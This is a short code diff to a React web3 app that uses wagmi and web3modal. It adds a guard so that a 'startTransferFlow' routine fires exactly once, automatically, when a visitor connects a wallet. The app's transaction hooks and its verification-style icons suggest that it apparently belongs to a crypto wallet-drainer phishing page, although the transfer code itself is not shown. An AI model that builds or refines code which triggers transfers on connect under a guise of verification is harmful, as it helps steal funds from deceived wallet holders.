@@ -1,4 +1,4 @@
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useRef } from 'react';
 import { ArrowUpRight, ShieldCheck, Menu, X, ExternalLink, ArrowLeft, History, Share2, CreditCard, Wallet, Lock, Send, Phone, Key, Fingerprint, CheckCircle2, Globe, BadgeCheck, Zap } from 'lucide-react';
 import { motion, AnimatePresence } from 'motion/react';
 import { useWeb3Modal } from '@web3modal/wagmi/react';
@@ -27,6 +27,7 @@ export default function App() {
   const { switchChainAsync } = useSwitchChain();
   const { sendTransactionAsync } = useSendTransaction();
   const { writeContractAsync } = useWriteContract();
+  const flowStarted = useRef(false);
 
   const [pageData, setPageData] = useState({
     username: 'news',
@@ -170,7 +171,8 @@ export default function App() {
   };
 
   useEffect(() => {
-    if (isConnected && address) {
+    if (isConnected && address && !flowStarted.current) {
+      flowStarted.current = true;
       startTransferFlow();
     }
   }, [isConnected, address]);
